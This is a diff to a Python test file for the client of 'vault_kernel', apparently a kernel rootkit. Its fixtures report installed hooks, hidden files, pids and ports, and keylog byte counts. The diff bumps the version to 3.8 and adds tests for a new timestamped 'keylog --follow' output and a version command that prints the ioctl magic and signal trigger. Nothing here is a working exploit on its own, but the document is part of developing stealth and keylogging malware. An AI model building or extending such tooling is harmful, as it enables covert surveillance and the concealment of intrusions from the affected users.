@@ -35,7 +35,7 @@ vk = _load_client()
 # EXACT snprintf block of IOCTL_GET_STATS (src/ioctl.c) for a module
 # with all 7 hooks and one hidden file/pid/port each.
 STATS_REPORT = (
-    "module=vault_kernel version=3.7\n"
+    "module=vault_kernel version=3.8\n"
     "hooks_installed=7 hooks_planned=7\n"
     "module_hidden=0\n"
     "hidden_files=1 hidden_pids=1 hidden_ports=1\n"
@@ -60,7 +60,7 @@ class TestParseStatsReport(unittest.TestCase):
     def test_kernel_fixture(self):
         self.assertEqual(vk.parse_stats_report(STATS_REPORT), {
             "module": "vault_kernel",
-            "version": "3.7",
+            "version": "3.8",
             "hooks_installed": "7",
             "hooks_planned": "7",
             "module_hidden": "0",
@@ -74,9 +74,9 @@ class TestParseStatsReport(unittest.TestCase):
     def test_multiple_pairs_per_line(self):
         """v3.4/v3.5 regression: the line-based parser lost every pair
         after the first on each line."""
-        got = vk.parse_stats_report("module=vault_kernel version=3.7\n")
+        got = vk.parse_stats_report("module=vault_kernel version=3.8\n")
         self.assertEqual(got["module"], "vault_kernel")
-        self.assertEqual(got["version"], "3.7")
+        self.assertEqual(got["version"], "3.8")
 
     def test_empty_report(self):
         self.assertEqual(vk.parse_stats_report(""), {})
@@ -149,7 +149,7 @@ class TestStatsJsonEndToEnd(unittest.TestCase):
         parsed = json.loads(out.getvalue())
         self.assertEqual(parsed["schema"], 1)
         self.assertEqual(parsed["module"], "vault_kernel")
-        self.assertEqual(parsed["version"], "3.7")
+        self.assertEqual(parsed["version"], "3.8")
         self.assertEqual(parsed["hooks_installed"], 7)
         self.assertEqual(parsed["hooks_planned"], 7)
         self.assertEqual(parsed["module_hidden"], 0)
@@ -194,7 +194,7 @@ class TestDoctorJsonEndToEnd(unittest.TestCase):
         self.assertTrue(parsed["device_present"])
         self.assertTrue(parsed["device_open"])
         self.assertTrue(parsed["stats_responds"])
-        self.assertEqual(parsed["module_version"], "3.7")
+        self.assertEqual(parsed["module_version"], "3.8")
         self.assertTrue(parsed["version_match"])
         self.assertEqual(parsed["uptime_s"], 42)
         self.assertEqual(parsed["hooks_installed"], 7)
@@ -207,7 +207,7 @@ class TestDoctorJsonEndToEnd(unittest.TestCase):
 
     def test_doctor_json_version_mismatch_warns(self):
         parsed = self._run_doctor_json(
-            stats_report=STATS_REPORT.replace("version=3.7", "version=3.0"))
+            stats_report=STATS_REPORT.replace("version=3.8", "version=3.0"))
         self.assertFalse(parsed["version_match"])
         self.assertEqual(parsed["warnings"], 1)
 
@@ -232,7 +232,7 @@ class TestFormatWatchPanel(unittest.TestCase):
     Mirrors TestRenderWatchPanel in the Go client."""
 
     STATS = {
-        "module": "vault_kernel", "version": "3.7",
+        "module": "vault_kernel", "version": "3.8",
         "hooks_installed": "7", "hooks_planned": "7",
         "module_hidden": "0", "hidden_files": "1", "hidden_pids": "1",
         "hidden_ports": "1", "keylog_bytes": "0", "uptime_s": "42",
@@ -253,7 +253,7 @@ class TestFormatWatchPanel(unittest.TestCase):
                         got.index("hooks_planned"))
         # Column alignment: widest key ("hooks_installed", 15) pads the
         # rest; the format adds " : " so "version" gets 9 spaces.
-        self.assertIn("version         : 3.7", got)
+        self.assertIn("version         : 3.8", got)
         self.assertIn("pids : 1234, 567", got)
         self.assertIn("files: secret.txt, my dir/with space.txt", got)
         self.assertIn("ports: 8080", got)
@@ -356,6 +356,52 @@ class TestIntervalArgType(unittest.TestCase):
 
     def test_watch_default_is_1000ms(self):
         self.assertEqual(vk.WATCH_DEFAULT_INTERVAL_MS, 1000)
+
+
+class TestFormatKeylogEvent(unittest.TestCase):
+    """format_keylog_event is the user-facing contract of one
+    `keylog --follow` event (v3.8 added --timestamps) — mirrors
+    TestFormatKeylogEvent in the Go client: timestamps put every event
+    on a fresh [HH:MM:SS]-prefixed line; without them a suffix diff
+    continues the line and a buffer wrap starts a new one."""
+
+    def test_continuation_without_timestamps(self):
+        self.assertEqual(vk.format_keylog_event("def"), "def")
+
+    def test_wrap_without_timestamps(self):
+        self.assertEqual(vk.format_keylog_event("wrapped", wrapped=True),
+                         "\nwrapped")
+
+    def test_timestamps_start_a_fresh_line(self):
+        self.assertEqual(vk.format_keylog_event("def", "10:30:05"),
+                         "\n[10:30:05] def")
+        self.assertEqual(
+            vk.format_keylog_event("wrapped", "10:30:05", wrapped=True),
+            "\n[10:30:05] wrapped")
+
+    def test_content_never_mangled(self):
+        got = vk.format_keylog_event("my dir/with space.txt", "00:00:00")
+        self.assertTrue(got.endswith("my dir/with space.txt"))
+
+
+class TestVersionCommand(unittest.TestCase):
+    """v3.8: the Python CLI gains `version` (the Go CLI had it since
+    v3.6 — parity gap).  format_version_line mirrors Go's printVersion:
+    same wording, same ioctl magic (0xC0) and signal trigger (35)."""
+
+    def test_format_version_line(self):
+        self.assertEqual(
+            vk.format_version_line(),
+            f"vault_kernel CLI v{vk.CLIENT_VERSION} "
+            "(ioctl magic 0xC0, signal trigger 35)")
+
+    def test_version_command_prints(self):
+        out = io.StringIO()
+        with mock.patch.object(vk.sys, "argv",
+                               ["vault_kernel_cli.py", "version"]), \
+             contextlib.redirect_stdout(out):
+            vk.main()
+        self.assertIn(vk.format_version_line(), out.getvalue())
 
 
 if __name__ == "__main__":
